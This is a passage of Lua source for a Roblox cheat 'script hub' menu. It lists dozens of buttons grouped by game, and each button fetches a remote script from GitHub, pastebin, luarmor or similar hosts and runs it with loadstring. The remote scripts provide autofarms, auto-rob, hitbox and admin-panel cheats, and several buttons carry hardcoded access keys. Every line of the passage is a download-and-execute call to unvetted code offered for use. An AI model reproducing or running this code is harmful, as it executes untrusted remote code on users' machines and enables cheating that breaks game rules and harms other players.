    vu1:Notification("Notification", "FlamingDrey Activated", "Okay!")
end)
v12:Button("Enable Darkrai-X Mod(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Bedwars", true))()
    vu1:Notification("Notification", "Darkrai-X Mod Activated", "Okay!")
end)
local v13 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 MM2")
v13:Button("Enable KidichiHB V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KidichiHB/Kidachi/main/Scripts/MM2_V2"))()
    vu1:Notification("Notification", "KidichiHB Activated", "Okay!")
end)
v13:Button("Enable Drifter0507", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))()
    vu1:Notification("Notification", "Drifter0507 Activated", "Okay!")
end)
v13:Button("Enable  Vynixu\'s", function()
    loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
    vu1:Notification("Notification", " Vynixu\'s Activated", "Okay!")
end)
v13:Button("Enable NukeVsCity(ScriptHub)(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader", true))()
    vu1:Notification("Notification", "NukeVsCity Activated", "Okay!")
end)
v13:Button("Enable MarsQQ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel", true))()
    vu1:Notification("Notification", "MarsQQ Activated", "Okay!")
end)
v13:Button("Enable CE-Technologies", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptemt/CE-Technologies/main/script", true))()
    vu1:Notification("Notification", "CE-Technologies Activated", "Okay!")
end)
v13:Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/summer2024", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v13:Button("Enable HighlightMM2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
    vu1:Notification("Notification", "HighlightMM2 Activated", "Okay!")
end)
v13:Button("Enable Etronix", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/32dbf9ddc1e86a18f726c3ca703f0302.lua"))()
    vu1:Notification("Notification", "Etronix Activated", "Okay!")
end)
v13:Button("Enable yarhm", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", true))()
    vu1:Notification("Notification", "yarhm Activated", "Okay!")
end)
v13:Button("Enable R3TH PRIV HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
    vu1:Notification("Notification", "R3TH PRIV HUB Activated", "Okay!")
end)
v13:Button("Enable R3THPRIV", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SimplySentinel/r3th/main/loader.lua"))()
    vu1:Notification("Notification", "R3THPRIV Activated", "Okay!")
end)
v13:Button("Enable SymphonyHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua", true))()
    vu1:Notification("Notification", "SymphonyHub Activated", "Okay!")
end)
v13:Button("Enable nexus", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring", true))()
    vu1:Notification("Notification", "nexus Activated", "Okay!")
end)
v13:Button("Enable DarkCheatClient", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VaniaPerets/FolderGui-FolderHub/main/loader.lua", true))()
    vu1:Notification("Notification", "DarkCheatClient Activated", "Okay!")
end)
v13:Button("Enable GG-HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe", true))()
    vu1:Notification("Notification", "gg-HUB Activated", "Okay!")
end)
v13:Button("Enable BaconBossScript", function()
    loadstring(game:HttpGet("https://pastefy.app/imc0fdpK/raw", true))()
    vu1:Notification("Notification", "BaconBossScript Activated", "Okay!")
end)
v13:Button("Enable SnapSanix", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roman34296589/SnapSanix-GUI-MM2/main/SnapSanix%20GUI%20mm2.lua"))()
    vu1:Notification("Notification", "SnapSanix Activated", "Okay!")
end)
v13:Button("Enable AtherHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Athergaming/Roblox-Murder-Mystery-2-Script/main/AtherHub%20Murder%20Mystery%202%20Script.lua"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "AtherHub Activated", "Okay!")
end)
v13:Button("Enable Vertex(10/17/24)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Vertex Activated", "Okay!")
end)
v13:Button("Enable MM2AutofarmHalloweenScript (10/17/24)", function()
    _G.AutofarmSettings = {
        AntiAfk = true,
        DelayFarm = 2.15,
        ResetWhenFullBag = true,
        CoinType = "Candy",
        Disable3DRendering = false,
        ImproveFPS = false,
        StartAutofarm = false
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoCapital2/MM2Autofarm/main/HalloweenScript"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "MM2Autofarm Activated", "Okay!")
end)
v13:Button("Enable XhubMM2(10/19/24)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
    vu1:Notification("Notification", "XhubMM2 Activated", "Okay!")
end)
v13:Button("Enable BACONBOSSSCRIPTS(FAST-AUTOFARM)(10/21/24)", function()
    loadstring(game:HttpGet("https://pastefy.app/FPGI0uTW/raw", true))()
    vu1:Notification("Notification", "BACONBOSSSCRIPTS Activated", "Okay!")
end)
v13:Button("Enable BeeconHub(Key System)(10/21/24)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
    vu1:Notification("Notification", "BeeconHub Activated", "Okay!")
end)
local v14 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 KingLegacy")
v14:Button("Enable HOHO_H", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
    vu1:Notification("Notification", "King-Legacy Activated", "Okay!")
end)
v14:Button("Enable ArcHub", function()
    getgenv().RaidUI = false
    getgenv().CustomDistance = 10
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChopLoris/ArcHub/main/main.lua"))()
    vu1:Notification("Notification", "ArcHub Activated", "Okay!")
end)
v14:Button("Enable XRayDerxDOne", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRayDerxDOne/Release-/main/Release.lua"))()
    vu1:Notification("Notification", "XRayDerxDOne Activated", "Okay!")
end)
v14:Button("Enable Arc-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChopLoris/ArcHub/main/PC.lua"))()
    vu1:Notification("Notification", "Arc-Hub Activated", "Okay!")
end)
local v15 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 KAT")
v15:Button("Enable OwlHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt", true))()
    vu1:Notification("Notification", "OwlHub Activated", "Okay!")
end)
v15:Button("Enable JNHHGaming", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Kat12/main/Kat", true))()
    vu1:Notification("Notification", "JNHHGaming Activated", "Okay!")
end)
v15:Button("Enable KAT Script Flame X Development", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/KAT-SCRIPT-/main/Kat%20Script%20Roblox"))()
    vu1:Notification("Notification", "FlamingDrey Activated", "Okay!")
end)
v15:Button("Enable Lime X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/katscripvxz2/main/katscripvxz2"))()
    vu1:Notification("Notification", "Lime X Activated", "Okay!")
end)
v15:Button("Enable belugaware", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter1cursed1rade/BelugaWare-1.4/main/belugaware.lua"))()
    vu1:Notification("Notification", "belugaware Activated", "Okay!")
end)
local v16 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Doors")
v16:Button("Enable BlackKing", function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/R8QMbhzv"))()
    vu1:Notification("Notification", "BlackKing Activated", "Okay!")
end)
v16:Button("Enable Doors-Script", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/9QPGnLx6", true))()
    vu1:Notification("Notification", "Doors-Script Activated", "Okay!")
end)
v16:Button("Enable Darkrai-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors", true))()
    vu1:Notification("Notification", "Darkrai-X Activated", "Okay!")
end)
v16:Button("Enable Chiba-Doors", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KindIhave/ChibaHubcomeback/main/Chiba-Doors.txt", true))()
    vu1:Notification("Notification", "Chiba-Doors Activated", "Okay!")
end)
v16:Button("Enable KINGHUB01", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
    vu1:Notification("Notification", "KINGHUB01 Activated", "Okay!")
end)
v16:Button("Enable FFJ1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
    vu1:Notification("Notification", "FFJ1 Activated", "Okay!")
end)
v16:Button("Enable VaniaPerets", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VaniaPerets/FolderGui-FolderHub/main/loader.lua", true))()
    vu1:Notification("Notification", "VaniaPerets Activated", "Okay!")
end)
v16:Button("Enable ScriptHub", function()
    loadstring(game:HttpGet("https://pastefy.app/Sje3EJsH/raw"))()
    vu1:Notification("Notification", "ScriptHub Activated", "Okay!")
end)
v16:Button("Enable Floor 1 and Floor 2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/Python/main/Main.lua"))()
    vu1:Notification("Notification", "Floor 1 and Floor 2 Activated", "Okay!")
end)
local v17 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Breaking-Point")
v17:Button("Enable H4R7NHacks(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Obfuscated/master/Breaking%20Point%20H4R7N%20Hack.lua"))()
    vu1:Notification("Notification", "H4R7NHacks Activated", "Okay!")
end)
v17:Button("Enable H4R7NHacks1.2(NEW)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Obfuscated/master/Breaking%20Point%20H4R7N%20Hack%20v1.2.lua"))()
    vu1:Notification("Notification", "H4R7NHacks Activated", "Okay!")
end)
v17:Button("Enable ColdStep2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ColdStep2/Breaking-Point-Funny-Squid-Hax/main/Breaking%20Point%20Funny%20Squid%20Hax", true))()
    vu1:Notification("Notification", "ColdStep2 Activated", "Okay!")
end)
local v18 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Welcome to Bloxburg")
v18:Button("Enable Vysor", function()
    loadstring(game:HttpGet("https://vysorbloxburg.vercel.app/free.lua", true))()
    vu1:Notification("Notification", "Vysor Activated", "Okay!")
end)
v18:Button("Enable AutoFarm", function()
    ScriptJob = "HairDresser"
    ScriptKey = "95a31a8935aca5f92b840d22892124cd"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SurgeDid/Blockburg/main/loader.lua"))()
    ScriptJob = "PizzaDelivery"
    ScriptKey = "95a31a8935aca5f92b840d22892124cd"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SurgeDid/Blockburg/main/loader.lua"))()
    ScriptJob = "FisherMan"
    ScriptKey = "95a31a8935aca5f92b840d22892124cd"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SurgeDid/Blockburg/main/loader.lua"))()
    vu1:Notification("Notification", "Autofarm Activated", "Okay!")
end)
v18:Label("Must be barber or pizza delivery or fisherman")
v18:Button("Enable SurgeDid", function()
    getgenv().ScriptJob = "HairDresser"
    getgenv().ScriptKey = "95a31a8935aca5f92b840d22892124cd"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SurgeDid/Blockburg/main/loader.lua"))()
    vu1:Notification("Notification", "SurgeDid Activated", "Okay!")
end)
v18:Label("Must be HairDresser So the autofarm works")
local v19 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Natural Disaster Survival")
v19:Button("Enable ZeeroxHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
    vu1:Notification("Notification", "ZeeroxHub Activated", "Okay!")
end)
v19:Button("Enable LiverMods", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/Rawnder-NTDR/main/NaturalDisaster"))()
    vu1:Notification("Notification", "LiverMods Activated", "Okay!")
end)
v19:Button("Enable VortexAblity", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartModBoy/VortexAblity/main/SV"))()
    vu1:Notification("Notification", "VortexAblity Activated", "Okay!")
end)
v19:Button("Enable VHPHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/HPHub/main/HPHub.lua"))()
    vu1:Notification("Notification", "HPHub Activated", "Okay!")
end)
v19:Button("Enable Pr0jectNight", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pr0jectNight/Script-Hubs/main/Antares/NaturalDisasters.lua"))()
    vu1:Notification("Notification", "Pr0jectNight Activated", "Okay!")
end)
v19:Button("Enable SIX-HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ySixxNz/Natural-Desastre/SIX-MENU/SIX-HUB-NATURAL-DESASTRE"))()
    vu1:Notification("Notification", "SIX-HUB Activated", "Okay!")
end)
v19:Button("Enable NDS-GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
    vu1:Notification("Notification", "NDS-GUI Activated", "Okay!")
end)
v19:Button("Enable Dashboard", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua"))()
    vu1:Notification("Notification", "Dashboard Activated", "Okay!")
end)
v19:Button("Enable CHHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
    vu1:Notification("Notification", "CHHub Activated", "Okay!")
end)
local v20 = v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Fisch")
v20:Button("Enable Speed-Hub-X(Keyless)", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Fisch-Speed-Hub-X-No-Key-Free-21187"))()
    vu1:Notification("Notification", "Speed-Hub-X Activated", "Okay!")
end)
v20:Button("Enable Ronix Hub(Keyless)", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/db3eabc3826cdfb11cbad8c12a13db93.lua"))()
    vu1:Notification("Notification", "Speed-Hub-X Activated", "Okay!")
end)
local v21 = v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 JailBreak")
v21:Button("Enable Cashfarm", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TempIsGay/Cashfarm/main/AutoCrateFree.lua"))()
    vu1:Notification("Notification", "Cashfarm Activated", "Okay!")
end)
v21:Button("Enable vortexjb", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/devnorb/vortexjb/main/loader.lua"))()
    vu1:Notification("Notification", "vortexjb Activated", "Okay!")
end)
v21:Button("Enable BlitzIsKing", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular"))()
    vu1:Notification("Notification", "BlitzIsKing Activated", "Okay!")
end)
v21:Button("Enable AutoRobV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/AutoRobV4Release"))()
    vu1:Notification("Notification", "AutoRobV4 Activated", "Okay!")
end)
v21:Button("Enable UWUHub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8cf41f52e2d558a0ad7ea65aa1019f67.lua"))()
    vu1:Notification("Notification", "UWUhub Activated", "Okay!")
end)
v21:Button("Enable Dashboard", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnipeHype200/i-music/main/beta.lua"))()
    vu1:Notification("Notification", "Dashboard Activated", "Okay!")
end)
v21:Button("Enable i-music", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnipeHype200/i-music/main/beta.lua"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "i-music Activated", "Okay!")
end)
local v22 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Evade")
v22:Button("Enable Hydra network", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/6BbcWQJs", true))()
    vu1:Notification("Notification", "Hydra network Activated", "Okay!")
end)
v22:Button("Enable xyz.evade", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/xyz.evade/main/xyz.evade.lua", true))()
    vu1:Notification("Notification", "xyz.evade Activated", "Okay!")
end)
v22:Button("Enable D8rk-Hub", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Evade-D8rk-Hub-V2-12956"))()
    vu1:Notification("Notification", "D8rk-Hub Activated", "Okay!")
end)
v22:Button("Enable Darkrai-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
    vu1:Notification("Notification", "Darkrai-X Activated", "Okay!")
end)
v22:Button("Enable unknown hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Evade"))()
    vu1:Notification("Notification", "Unknown-Hub Activated", "Okay!")
end)
v22:Button("Enable zReal-King(KEY-SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zReal-King/Evade/main/Main.lua"))()
    vu1:Notification("Notification", "zReal-King Activated", "Okay!")
end)
v22:Button("Enable GhostHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
    vu1:Notification("Notification", "GhostHub Activated", "Okay!")
end)
v22:Button("Enable ArDrakxHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hungtu2121/ArDrakxHub/main/Evade-23-88-evade-Ardrak-evade-rvet-55"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "ArDrakxHub Activated", "Okay!")
end)
local v23 = v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Adopt-Me")
v23:Button("Enable JulHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
    vu1:Notification("Notification", "JulHub Activated", "Okay!")
end)
v23:Button("Enable BloxiYT", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxiYT/Diamond/main/AdoptMe"))()
    vu1:Notification("Notification", "BloxiYT Activated", "Okay!")
end)
local v24 = v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Combat-Warriors")
v24:Button("Enable Cw hub (OLD)", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gCBZsdsS", true))()
    vu1:Notification("Notification", "Cw hub Activated", "Okay!")
end)
v24:Button("Enable PlutonIum Hub(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
    vu1:Notification("Notification", "PlutonIum hub Activated", "Okay!")
end)
v24:Button("Enable MaxHub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1d4db6a1b04aaeccf046f7c63fbad31a.lua"))()
    vu1:Notification("Notification", "MaxHub Activated", "Okay!")
end)
v24:Button("Enable Infinixity", function()
    local v25 = loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))
    v25(v25)
    vu1:Notification("Notification", "Infinixity Activated", "Okay!")
end)
local v26 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 BrookHaven")
v26:Button("Enable REDzHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()
    vu1:Notification("Notification", "REDzHUB Activated", "Okay!")
end)
v26:Button("Enable JulHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
    vu1:Notification("Notification", "JulHub Activated", "Okay!")
end)
v26:Button("Enable ImperialHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua", true))()
    vu1:Notification("Notification", "ImperialHub Activated", "Okay!")
end)
v26:Button("Enable SanderX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sXPiterXs1111/SanderX/main/SanderX.lua"))()
    vu1:Notification("Notification", "SanderX Activated", "Okay!")
end)
v26:Button("Enable TheDarkoneMarcillisePex", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui"))()
    vu1:Notification("Notification", "TheDarkoneMarcillisePex Activated", "Okay!")
end)
local v27 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Bee Swarm Simulator")
v27:Button("Enable HistyHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Histy"))()
    vu1:Notification("Notification", "HistyHub Activated", "Okay!")
end)
v27:Button("Enable Bedol Hub (Key System)(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Others/main/Bee_Swarm_Simulator.lua"))()
    vu1:Notification("Notification", "Bedol Hub Activated", "Okay!")
end)
v27:Button("Enable BaconBossScript)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeSwarmSim/main/BeeSwarmSim"))()
    vu1:Notification("Notification", "BaconBossScript Activated", "Okay!")
end)
v27:Button("Enable MarcoV3 (Key System)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Others/main/Bee_Swarm_Simulator.lua"))()
    vu1:Notification("Notification", "Bedol Hub Activated", "Okay!")
end)
local v28 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Anime-Defenders")
v28:Button("Enable Infinixity", function()
    local v29 = loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))
    v29(v29)
    vu1:Notification("Notification", "Infinixity Activated", "Okay!")
end)
v28:Button("Enable buanghub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))()
    vu1:Notification("Notification", "buanghub Activated", "Okay!")
end)
v28:Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/anime98/main/defenders"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v28:Button("Enable ReaperScripts", function()
    loadstring(http.request({
        Url = "https://reaperscripts.com/loader?l=1"
    }).Body, "0zek8y2bld7.qowl6c7o~1")()
    vu1:Notification("Notification", "ReaperScripts Activated", "Okay!")
end)
v28:Button("Enable Nausigi", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Nausigi"))()
    vu1:Notification("Notification", "Nausigi Activated", "Okay!")
end)
local v30 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 PETS GO!")
v30:Button("Enable ZapHub (KEY SYSTEM- BEST SCRIPT)", function()
    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
    vu1:Notification("Notification", "ZapHub Activated", "Okay!")
end)
v30:Button("Enable Speed-Hub-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
    vu1:Notification("Notification", "Speed-Hub-X Activated", "Okay!")
end)
v30:Button("Enable LOLking123456(KEY-SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Go/refs/heads/main/Pet"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v30:Button("Enable AtherHub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
    vu1:Notification("Notification", "AtherHub Activated", "Okay!")
end)
v30:Button("Enable syrexhub(key-system)", function()
    loadstring(game:HttpGet("https://syrexhub.netlify.app/raw/syrexhub"))()
    vu1:Notification("Notification", "syrexhub Activated", "Okay!")
end)
local v31 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Petsim-99")
v31:Button("Enable Speed-Hub-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
    vu1:Notification("Notification", "Speed-Hub-X Activated", "Okay!")
end)
v31:Button("Enable zaphub", function()
    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
    vu1:Notification("Notification", "zaphub Activated", "Okay!")
end)
v31:Button("Enable REDzHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
    vu1:Notification("Notification", "REDzHUB Activated", "Okay!")
end)
v31:Button("Enable Pet\'Sim-99(Solara)", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nuke-Hub-V4-SOLARA-Support-KEYLESS-16495"))()
    vu1:Notification("Notification", "Pet\'Sim-99(Solara) Activated", "Okay!")
end)
v31:Button("Enable Speed-Hub-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Speed-Hub-X Activated", "Okay!")
end)
local v32 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Funky friday")
v32:Button("Enable Funky-Friday", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-script-9154"))()
    vu1:Notification("Notification", "Funky-Friday Activated", "Okay!")
end)
v32:Button("Enable Funky-Friday Mobile", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
    vu1:Notification("Notification", "Funky-Friday Activated", "Okay!")
end)
v32:Button("Enable Plutonium.lua", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
    vu1:Notification("Notification", "Plutonium.lua Activated", "Okay!")
end)
v32:Button("Enable Newgay", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/washingtontrichkid2/Newgay/main/ff"))()
    vu1:Notification("Notification", "Newgay Activated", "Okay!")
end)
v32:Button("Enable UniHub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/dcyuEgyK"))()
    vu1:Notification("Notification", "UniHub Activated", "Okay!")
end)
local v33 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 GUNFIGHT-ARENA")
v33:Button("Enable thaibao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubGunfightArena"))()
    vu1:Notification("Notification", "thaibao Activated", "Okay!")
end)
v33:Button("Enable LOLking123456 (KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Arena/main/Fight"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
local v34 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 PLS-DONATE ")
v34:Button("Enable tubhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tuba8890/tubhub/main/DNY8oDv9ey/loader.lua"))()
    vu1:Notification("Notification", "tubhub Activated", "Okay!")
end)
v34:Button("Enable CF-Trail", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua"))()
    vu1:Notification("Notification", "CF-Trail Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Be A Parkour Ninja"):Button("Enable Hitbox", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Min1273/n-to/main/README.md"))()
    vu1:Notification("Notification", "htibox Activated", "Okay!")
end)
local v35 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Muderers Vs Sheriffs DUELS")
v35:Button("Enable AUTH HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/unauth0rised/Roblox-Scripts/main/Auth%20Hub.lua"))()
    vu1:Notification("Notification", "AUJTH HUB Activated", "Okay!")
end)
v35:Button("Enable thaibao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurdervssheriff"))()
